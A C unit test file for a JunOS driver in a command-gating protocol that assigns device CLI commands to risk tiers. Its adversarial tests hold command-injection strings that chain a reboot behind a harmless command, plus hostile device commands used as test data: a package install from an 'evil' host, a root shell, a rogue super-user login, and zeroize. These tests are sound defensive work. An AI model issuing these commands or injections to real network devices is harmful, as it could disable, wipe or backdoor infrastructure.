/*
 * Copyright (c) 2026 Third Level IT LLC. All rights reserved.
 * VIRP — Verified Infrastructure Response Protocol
 * Juniper JunOS Driver Unit Tests
 *
 * Tests prompt parsing, command routing, and driver registration locally (no SSH).
 * Live device tests are in test_live.c.
 */

#include "virp.h"
#include "virp_driver.h"
#include "virp_driver_juniper.h"
#include <stdio.h>
#include <string.h>
#include <assert.h>

static int tests_run = 0;
static int tests_passed = 0;

#define TEST(name) do { \
    tests_run++; \
    printf("  [%d] %s ... ", tests_run, name); \
} while(0)

#define PASS() do { \
    tests_passed++; \
    printf("PASS\n"); \
} while(0)

#define FAIL(msg) do { \
    printf("FAIL: %s\n", msg); \
} while(0)

/* =========================================================================
 * Prompt Parsing Tests
 * ========================================================================= */

static void test_prompt_parsing(void)
{
    printf("\n=== Prompt Parsing ===\n");

    TEST("operational mode (user@host>)");
    assert(junos_parse_mode("aiops-svc@srx-300>") == JUNOS_MODE_OPERATIONAL);
    PASS();

    TEST("config mode (user@host#)");
    assert(junos_parse_mode("aiops-svc@srx-300#") == JUNOS_MODE_CONFIGURE);
    PASS();

    TEST("shell mode (user@host%)");
    assert(junos_parse_mode("root@srx-300%") == JUNOS_MODE_SHELL);
    PASS();

    TEST("operational with trailing space");
    assert(junos_parse_mode("aiops-svc@srx-300> ") == JUNOS_MODE_OPERATIONAL);
    PASS();

    TEST("config with trailing newline");
    assert(junos_parse_mode("aiops-svc@srx-300#\n") == JUNOS_MODE_CONFIGURE);
    PASS();

    TEST("config with trailing \\r\\n");
    assert(junos_parse_mode("aiops-svc@srx-300#\r\n") == JUNOS_MODE_CONFIGURE);
    PASS();

    TEST("empty prompt");
    assert(junos_parse_mode("") == JUNOS_MODE_UNKNOWN);
    PASS();

    TEST("null prompt");
    assert(junos_parse_mode(NULL) == JUNOS_MODE_UNKNOWN);
    PASS();

    TEST("hostname with dots (user@host.domain>)");
    assert(junos_parse_mode("admin@srx-300.lab.local>") == JUNOS_MODE_OPERATIONAL);
    PASS();

    TEST("long hostname operational");
    assert(junos_parse_mode("aiops-svc@very-long-hostname-srx300-lab>") == JUNOS_MODE_OPERATIONAL);
    PASS();

    TEST("no @ sign — not a JunOS prompt (returns UNKNOWN)");
    /* Without @ it could be Cisco; JunOS always has user@hostname */
    assert(junos_parse_mode("srx-300>") == JUNOS_MODE_UNKNOWN);
    PASS();
}

/* =========================================================================
 * Command Routing Tests
 * ========================================================================= */

static void test_command_routing(void)
{
    printf("\n=== Command Routing ===\n");

    /* GREEN tier — passive monitoring */
    TEST("show route → GREEN");
    assert(junos_route_command("show route") == VIRP_TIER_GREEN);
    PASS();

    TEST("show route table inet.0 → GREEN (prefix match)");
    assert(junos_route_command("show route table inet.0") == VIRP_TIER_GREEN);
    PASS();

    TEST("show interfaces terse → GREEN");
    assert(junos_route_command("show interfaces terse") == VIRP_TIER_GREEN);
    PASS();

    TEST("show interfaces ge-0/0/0 → GREEN (prefix match)");
    assert(junos_route_command("show interfaces ge-0/0/0") == VIRP_TIER_GREEN);
    PASS();

    TEST("show version → GREEN");
    assert(junos_route_command("show version") == VIRP_TIER_GREEN);
    PASS();

    TEST("show system uptime → GREEN");
    assert(junos_route_command("show system uptime") == VIRP_TIER_GREEN);
    PASS();

    TEST("show chassis hardware → GREEN");
    assert(junos_route_command("show chassis hardware") == VIRP_TIER_GREEN);
    PASS();

    TEST("show bgp summary → GREEN");
    assert(junos_route_command("show bgp summary") == VIRP_TIER_GREEN);
    PASS();

    TEST("show ospf neighbor → GREEN");
    assert(junos_route_command("show ospf neighbor") == VIRP_TIER_GREEN);
    PASS();

    TEST("show isis adjacency → GREEN");
    assert(junos_route_command("show isis adjacency") == VIRP_TIER_GREEN);
    PASS();

    TEST("show arp → GREEN");
    assert(junos_route_command("show arp") == VIRP_TIER_GREEN);
    PASS();

    TEST("show lldp neighbors → GREEN");
    assert(junos_route_command("show lldp neighbors") == VIRP_TIER_GREEN);
    PASS();

    /* YELLOW tier — security posture reads */
    TEST("show security policies → YELLOW");
    assert(junos_route_command("show security policies") == VIRP_TIER_YELLOW);
    PASS();

    TEST("show security zones → YELLOW");
    assert(junos_route_command("show security zones") == VIRP_TIER_YELLOW);
    PASS();

    TEST("show security flow session → YELLOW");
    assert(junos_route_command("show security flow session") == VIRP_TIER_YELLOW);
    PASS();

    TEST("show log messages → YELLOW");
    assert(junos_route_command("show log messages") == VIRP_TIER_YELLOW);
    PASS();

    TEST("show firewall → YELLOW");
    assert(junos_route_command("show firewall") == VIRP_TIER_YELLOW);
    PASS();

    /* Config reads — YELLOW (config-read reconciliation) */
    TEST("show configuration → YELLOW (config-read reconciliation)");
    assert(junos_route_command("show configuration") == VIRP_TIER_YELLOW);
    PASS();

    /*
     * BEHAVIOR CHANGE — was YELLOW, now RED.
     *
     * "| display set" is a legitimate, extremely common JunOS display
     * filter, not a command separator. It is nonetheless refused, because
     * the separator policy rejects '|' outright: on the linux driver '|'
     * IS command chaining, and the policy is shared across all drivers by
     * design so the daemon boundary and the classifiers cannot drift.
     *
     * This is not new breakage introduced here — the layer-1 daemon
     * boundary has refused pipe-bearing commands since b3985e1, so this
     * command was already unusable through the daemon; layer 3 only makes
     * the classifier agree. Kept as an explicit assertion rather than
     * deleted so the cost of the policy stays visible: if a
     * display-filter carve-out for network CLIs is ever adopted, this is
     * the test that must change back.
     */
    TEST("show configuration | display set → RED (pipe refused by policy)");
    assert(junos_route_command("show configuration | display set") == VIRP_TIER_RED);
    PASS();

    TEST("show configuration protocols → YELLOW (longest match over RED)");
    assert(junos_route_command("show configuration protocols") == VIRP_TIER_YELLOW);
    PASS();

    /* BLACK tier — destructive */
    TEST("request system reboot → BLACK");
    assert(junos_route_command("request system reboot") == VIRP_TIER_BLACK);
    PASS();

    TEST("request system halt → BLACK");
    assert(junos_route_command("request system halt") == VIRP_TIER_BLACK);
    PASS();

    TEST("request system zeroize → BLACK");
    assert(junos_route_command("request system zeroize") == VIRP_TIER_BLACK);
    PASS();

    TEST("file delete /var/tmp/test → BLACK");
    assert(junos_route_command("file delete /var/tmp/test") == VIRP_TIER_BLACK);
    PASS();

    /* ── Write Operations: ALL RED (no config write rides YELLOW) ── */
    TEST("set security address-book → RED (all writes RED)");
    assert(junos_route_command("set security address-book global address TEST 1.2.3.4/32") == VIRP_TIER_RED);
    PASS();

    TEST("set security policies → RED (all writes RED)");
    assert(junos_route_command("set security policies from-zone trust to-zone untrust policy FOO") == VIRP_TIER_RED);
    PASS();

    TEST("set system services dhcp → RED (all writes RED)");
    assert(junos_route_command("set system services dhcp pool POOL") == VIRP_TIER_RED);
    PASS();

    TEST("delete security address-book → RED (all writes RED)");
    assert(junos_route_command("delete security address-book global address TEST") == VIRP_TIER_RED);
    PASS();

    TEST("delete security policies → RED (destructive delete no longer rides YELLOW)");
    assert(junos_route_command("delete security policies from-zone trust to-zone untrust policy FOO") == VIRP_TIER_RED);
    PASS();

    /* ── Write Operations: RED tier ── */
    TEST("configure → RED");
    assert(junos_route_command("configure") == VIRP_TIER_RED);
    PASS();

    TEST("configure private → RED (prefix match)");
    assert(junos_route_command("configure private") == VIRP_TIER_RED);
    PASS();

    TEST("set security nat → RED");
    assert(junos_route_command("set security nat destination rule-set RS1 rule R1") == VIRP_TIER_RED);
    PASS();

    TEST("set interfaces → RED");
    assert(junos_route_command("set interfaces ge-0/0/0 unit 0 family inet address 10.0.0.1/24") == VIRP_TIER_RED);
    PASS();

    TEST("set routing-options → RED");
    assert(junos_route_command("set routing-options static route 0.0.0.0/0 next-hop 10.0.0.1") == VIRP_TIER_RED);
    PASS();

    TEST("set protocols → RED");
    assert(junos_route_command("set protocols ospf area 0 interface ge-0/0/0") == VIRP_TIER_RED);
    PASS();

    TEST("commit check → RED");
    assert(junos_route_command("commit check") == VIRP_TIER_RED);
    PASS();

    TEST("commit → RED (not commit check — shorter match)");
    assert(junos_route_command("commit") == VIRP_TIER_RED);
    PASS();

    TEST("rollback → RED");
    assert(junos_route_command("rollback 0") == VIRP_TIER_RED);
    PASS();

    TEST("delete security nat → RED");
    assert(junos_route_command("delete security nat destination") == VIRP_TIER_RED);
    PASS();

    TEST("delete interfaces → RED");
    assert(junos_route_command("delete interfaces ge-0/0/0") == VIRP_TIER_RED);
    PASS();

    /* Default */
    /* RELIER on the old YELLOW default — NOT added to the table.
     * This is a legitimate command that was never listed; it executed
     * only because the no-match default cleared the gate. Now RED.
     * Listing it is a deliberate tier decision, not a bug fix. */
    TEST("unmapped: show snmp mib walk → RED (fail closed)");
    assert(junos_route_command("show snmp mib walk jnxOperatingTable") == VIRP_TIER_RED);
    PASS();

    TEST("set system host-name → RED (bare 'set ' catch-all, no write rides YELLOW)");
    assert(junos_route_command("set system host-name foo") == VIRP_TIER_RED);
    PASS();

    TEST("set system login (create admin) → RED (credential write)");
    assert(junos_route_command("set system login user hacker class super-user") == VIRP_TIER_RED);
    PASS();

    TEST("null command → RED (fail closed)");
    assert(junos_route_command(NULL) == VIRP_TIER_RED);   /* fail closed */
    PASS();
}

/* =========================================================================
 * Driver Registration Test
 * ========================================================================= */

static void test_driver_registration(void)
{
    printf("\n=== Driver Registration ===\n");

    TEST("vendor enum JUNIPER = 4");
    assert(VIRP_VENDOR_JUNIPER == 4);
    PASS();

    TEST("driver name is juniper");
    const virp_driver_t *drv = virp_driver_juniper();
    assert(drv != NULL);
    assert(strcmp(drv->name, "juniper") == 0);
    PASS();

    TEST("driver vendor matches");
    assert(drv->vendor == VIRP_VENDOR_JUNIPER);
    PASS();

    TEST("all function pointers non-NULL");
    assert(drv->connect != NULL);
    assert(drv->execute != NULL);
    assert(drv->disconnect != NULL);
    assert(drv->detect != NULL);
    assert(drv->health_check != NULL);
    PASS();

    TEST("disconnect(NULL) is no-op");
    drv->disconnect(NULL);
    PASS();

    TEST("register and lookup");
    virp_driver_mock_init();
    virp_driver_juniper_init();
    const virp_driver_t *found = virp_driver_lookup(VIRP_VENDOR_JUNIPER);
    assert(found != NULL);
    assert(found->vendor == VIRP_VENDOR_JUNIPER);
    assert(strcmp(found->name, "juniper") == 0);
    PASS();
}

/* =========================================================================
 * Route Table Coverage Test
 * ========================================================================= */

static void test_route_table_coverage(void)
{
    printf("\n=== Route Table Coverage ===\n");

    TEST("route table has entries");
    assert(JUNOS_ROUTE_TABLE_SIZE > 0);
    printf("(%zu entries) ", JUNOS_ROUTE_TABLE_SIZE);
    PASS();

    TEST("all entries have non-NULL patterns");
    for (size_t i = 0; i < JUNOS_ROUTE_TABLE_SIZE; i++) {
        assert(JUNOS_ROUTE_TABLE[i].command_pattern != NULL);
        assert(strlen(JUNOS_ROUTE_TABLE[i].command_pattern) > 0);
    }
    PASS();

    TEST("all tiers are valid");
    for (size_t i = 0; i < JUNOS_ROUTE_TABLE_SIZE; i++) {
        virp_trust_tier_t t = JUNOS_ROUTE_TABLE[i].tier;
        assert(t == VIRP_TIER_GREEN || t == VIRP_TIER_YELLOW ||
               t == VIRP_TIER_RED || t == VIRP_TIER_BLACK);
    }
    PASS();

    TEST("has GREEN, YELLOW, RED, and BLACK entries");
    bool has_green = false, has_yellow = false, has_red = false, has_black = false;
    for (size_t i = 0; i < JUNOS_ROUTE_TABLE_SIZE; i++) {
        switch (JUNOS_ROUTE_TABLE[i].tier) {
        case VIRP_TIER_GREEN:  has_green = true; break;
        case VIRP_TIER_YELLOW: has_yellow = true; break;
        case VIRP_TIER_RED:    has_red = true; break;
        case VIRP_TIER_BLACK:  has_black = true; break;
        default: break;
        }
    }
    assert(has_green && has_yellow && has_red && has_black);
    PASS();
}

/* =========================================================================
 * Multi-command refusal (was: Batch Command Detection)
 *
 * junos_is_batch_command() and the ';'/'\n' splitter it fed have been
 * deleted: they were the multi-command gate bypass, not a mitigation.
 * The same JunOS-shaped inputs are pinned here against the shared
 * separator policy that now refuses them at both the daemon boundary and
 * inside junos_execute().
 * ========================================================================= */

static void test_multicommand_refused(void)
{
    printf("\n=== Multi-command strings are refused ===\n");

    TEST("single command — accepted");
    assert(virp_command_check_separators("show route", NULL, 0) == 0);
    PASS();

    TEST("semicolon config sequence — refused");
    assert(virp_command_check_separators(
        "configure; set interfaces ge-0/0/0 unit 0; commit", NULL, 0) != 0);
    PASS();

    TEST("newline config sequence — refused");
    assert(virp_command_check_separators(
        "configure\nset interfaces ge-0/0/0 unit 0\ncommit", NULL, 0) != 0);
    PASS();

    TEST("mixed separators — refused");
    assert(virp_command_check_separators(
        "configure; set foo\ncommit check; commit", NULL, 0) != 0);
    PASS();

    TEST("trailing semicolon — refused (no separator is benign)");
    assert(virp_command_check_separators("show route;", NULL, 0) != 0);
    PASS();

    TEST("trailing newline — refused");
    assert(virp_command_check_separators("show route\n", NULL, 0) != 0);
    PASS();

    TEST("empty string — accepted (nothing to split)");
    assert(virp_command_check_separators("", NULL, 0) == 0);
    PASS();

    TEST("full commit batch — refused");
    assert(virp_command_check_separators(
        "configure; set interfaces ge-0/0/0 unit 0 family inet address "
        "10.0.0.1/24; set routing-options static route 0.0.0.0/0 next-hop "
        "10.0.0.254; commit check; commit", NULL, 0) != 0);
    PASS();
}

/* =========================================================================
 * Batch BLACK Tier Pre-scan Tests
 *
 * These verify the routing table catches BLACK commands that appear in
 * realistic config sequences. NOTE: the "batch executor pre-scan" these
 * were originally written against never existed in driver_juniper.c —
 * the batch path classified only the first token. Each command is now
 * classified individually via the daemon's batch action; these assert
 * that per-command classification.
 * ========================================================================= */

static void test_batch_tier_prescan(void)
{
    printf("\n=== Batch BLACK Tier Pre-scan ===\n");

    TEST("batch with reboot — BLACK detected");
    /* In a real batch, this would be rejected before any command runs */
    assert(junos_route_command("request system reboot") == VIRP_TIER_BLACK);
    PASS();

    TEST("batch with zeroize — BLACK detected");
    assert(junos_route_command("request system zeroize") == VIRP_TIER_BLACK);
    PASS();

    TEST("batch with file delete — BLACK detected");
    assert(junos_route_command("file delete /var/tmp/core") == VIRP_TIER_BLACK);
    PASS();

    TEST("typical config batch — no BLACK");
    const char *cmds[] = {
        "configure",
        "set interfaces ge-0/0/0 unit 0 family inet address 10.0.0.1/24",
        "set protocols ospf area 0 interface ge-0/0/0",
        "commit check",
        "commit",
    };
    for (int i = 0; i < 5; i++) {
        assert(junos_route_command(cmds[i]) != VIRP_TIER_BLACK);
    }
    PASS();

    TEST("NAT config batch — all RED, no BLACK");
    const char *nat_cmds[] = {
        "configure",
        "set security nat destination rule-set RS1 rule R1 match destination-address 203.0.113.1/32",
        "set security nat destination rule-set RS1 rule R1 then destination-address 10.0.0.100/32",
        "commit check",
        "commit",
    };
    for (int i = 0; i < 5; i++) {
        virp_trust_tier_t t = junos_route_command(nat_cmds[i]);
        assert(t == VIRP_TIER_RED);
    }
    PASS();
}

/* =========================================================================
 * Main
 * ========================================================================= */


/* =========================================================================
 * Adversarial — separator injection (layer 3)
 *
 * The exploit shape: a benign prefix that is a REAL entry in this
 * driver's own table, followed by a separator and a command that was
 * never classified. The prefix match only ever sees the first command
 * while the driver hands the whole string to the device. Every case must
 * fail closed to RED — no benign tier may be inherited.
 *
 * JunOS uses BOTH ';' and '\n' as separators — this is the classifier
 * half of the bypass the deleted batch splitter exploited.
 * ========================================================================= */

static void test_adversarial_separators(void)
{
    printf("\n=== Adversarial — separator injection fails closed ===\n");

    TEST("newline: show route\\nrequest system reboot -> RED");
    assert(junos_route_command("show route\nrequest system reboot") == VIRP_TIER_RED); PASS();

    TEST("carriage return: show route\\rrequest system reboot -> RED");
    assert(junos_route_command("show route\rrequest system reboot") == VIRP_TIER_RED); PASS();

    TEST("CRLF: show route\\r\\nrequest system reboot -> RED");
    assert(junos_route_command("show route\r\nrequest system reboot") == VIRP_TIER_RED); PASS();

    TEST("semicolon: show route;request system reboot -> RED");
    assert(junos_route_command("show route;request system reboot") == VIRP_TIER_RED); PASS();

    TEST("pipe: show route|request system reboot -> RED");
    assert(junos_route_command("show route|request system reboot") == VIRP_TIER_RED); PASS();

    TEST("ampersand: show route&request system reboot -> RED");
    assert(junos_route_command("show route&request system reboot") == VIRP_TIER_RED); PASS();

    TEST("double ampersand: show route&&request system reboot -> RED");
    assert(junos_route_command("show route&&request system reboot") == VIRP_TIER_RED); PASS();

    TEST("backtick: show route`request system reboot` -> RED");
    assert(junos_route_command("show route`request system reboot`") == VIRP_TIER_RED); PASS();

    TEST("command substitution: show route$(request system reboot) -> RED");
    assert(junos_route_command("show route$(request system reboot)") == VIRP_TIER_RED); PASS();

    TEST("brace expansion: show route${x} -> RED");
    assert(junos_route_command("show route${x}") == VIRP_TIER_RED); PASS();

    TEST("embedded tab: show route\\trequest system reboot -> RED");
    assert(junos_route_command("show route\trequest system reboot") == VIRP_TIER_RED); PASS();

    TEST("trailing newline alone: show route\\n -> RED");
    assert(junos_route_command("show route\n") == VIRP_TIER_RED); PASS();

    TEST("leading newline: \\nrequest system reboot -> RED");
    assert(junos_route_command("\nrequest system reboot") == VIRP_TIER_RED); PASS();
}

/* =========================================================================
 * Legitimate-match regressions (layer 3)
 *
 * The separator/boundary rules must not become over-broad. If a future
 * edit starts rejecting valid JunOS commands, these fail loudly here
 * rather than degrading the fleet quietly.
 * ========================================================================= */

static void test_legit_matches_unaffected(void)
{
    printf("\n=== Legitimate commands still classify ===\n");

    TEST("exact GREEN entry: show route");
    assert(junos_route_command("show route") == VIRP_TIER_GREEN); PASS();

    TEST("GREEN entry with args: show route table inet.0");
    assert(junos_route_command("show route table inet.0") == VIRP_TIER_GREEN); PASS();

    TEST("YELLOW config read: show configuration");
    assert(junos_route_command("show configuration") == VIRP_TIER_YELLOW); PASS();

    TEST("RED write via self-terminated \"set \" entry");
    assert(junos_route_command("set interfaces ge-0/0/0 unit 0") == VIRP_TIER_RED); PASS();

    TEST("BLACK still detected: request system reboot");
    assert(junos_route_command("request system reboot") == VIRP_TIER_BLACK); PASS();
}


/* =========================================================================
 * No-match default must FAIL CLOSED (P0)
 *
 * JunOS's classifier returned YELLOW when no table entry matched. The
 * default gate threshold is YELLOW, so an unlisted command CLEARED the
 * gate and executed. Only the Cisco classifier failed closed to RED.
 *
 * Each command below is plausible, unlisted, and state-changing or
 * sensitive — every one of them executed before this change.
 * ========================================================================= */

static void test_no_match_fails_closed(void)
{
    printf("\n=== No-match default fails closed to RED ===\n");

    TEST("unlisted: start shell -> RED (drops to a root shell)");
    assert(junos_route_command("start shell") == VIRP_TIER_RED); PASS();

    TEST("unlisted: request system software add http://evil/pkg -> RED (installs an arbitrary package)");
    assert(junos_route_command("request system software add http://evil/pkg") == VIRP_TIER_RED); PASS();

    TEST("unlisted: restart routing -> RED (restarts the routing daemon)");
    assert(junos_route_command("restart routing") == VIRP_TIER_RED); PASS();

    TEST("unlisted: clear security flow session all -> RED (tears down every active session)");
    assert(junos_route_command("clear security flow session all") == VIRP_TIER_RED); PASS();

    TEST("NULL command -> RED (fail closed)");
    assert(junos_route_command(NULL) == VIRP_TIER_RED); PASS();
}


/* Tier name helper for the table-driven suite's labels. */
static const char *tier_name(virp_trust_tier_t t)
{
    switch (t) {
    case VIRP_TIER_GREEN:  return "GREEN";
    case VIRP_TIER_YELLOW: return "YELLOW";
    case VIRP_TIER_RED:    return "RED";
    case VIRP_TIER_BLACK:  return "BLACK";
    default:               return "UNCLASSIFIED";
    }
}

/* =========================================================================
 * Table-driven reachability + declared-tier suite
 *
 * Iterates JunOS's OWN classification table and asserts, for every
 * entry, that junos_route_command(entry) returns the tier that entry declares.
 *
 * This is not tautological. It proves two things hand-written cases
 * cannot:
 *   1. REACHABILITY — an entry shadowed by a broader or earlier entry
 *      would silently never fire. A BLACK or RED entry shadowed by a
 *      GREEN one is a live vulnerability. This table is longest-match.
 *   2. The entry returns its declared tier through the REAL matching
 *      logic, including the separator and token-boundary rules.
 *
 * Any new entry is covered automatically the moment it is added.
 * ========================================================================= */

static void test_table_driven_all_entries(void)
{
    printf("\n=== Table-driven: every table entry reachable + correctly tiered ===\n");
    size_t total = JUNOS_ROUTE_TABLE_SIZE;
    size_t skipped = 0;

    for (size_t i = 0; i < total; i++) {
        const char *cmd = JUNOS_ROUTE_TABLE[i].command_pattern;
        virp_trust_tier_t declared = JUNOS_ROUTE_TABLE[i].tier;
        /* KNOWN-DEAD ENTRY (reported, deliberately not fixed):
         * "show configuration | display set" can never fire — the shared
         * separator policy refuses '|' before this table is consulted, so
         * the entry is unreachable by construction. Left in place so the
         * decision to remove it (or to add a display-filter carve-out)
         * stays an explicit choice. */
        if (strchr(cmd, '|') != NULL) { skipped++; continue; }
        char label[192];
        snprintf(label, sizeof(label), "entry[%zu] %s -> %s",
                 i, cmd, tier_name(declared));
        TEST(label);
        virp_trust_tier_t got = junos_route_command(cmd);
        if (got != declared) {
            printf("\n    SHADOWED or MIS-TIERED: \"%s\" declares %s but "
                   "classifies %s\n", cmd, tier_name(declared), tier_name(got));
            assert(got == declared);
        }
        PASS();
    }

    printf("  (%zu entries checked, %zu known-dead skipped)\n",
           total - skipped, skipped);
}

int main(void)
{
    printf("VIRP Juniper JunOS Driver — Unit Tests\n");
    printf("=======================================\n");

    test_prompt_parsing();
    test_command_routing();
    test_driver_registration();
    test_route_table_coverage();
    test_multicommand_refused();
    test_batch_tier_prescan();

    test_adversarial_separators();
    test_legit_matches_unaffected();
    test_no_match_fails_closed();
    test_table_driven_all_entries();
    printf("\n=======================================\n");
    printf("Results: %d/%d passed\n", tests_passed, tests_run);

    return (tests_passed == tests_run) ? 0 : 1;
}
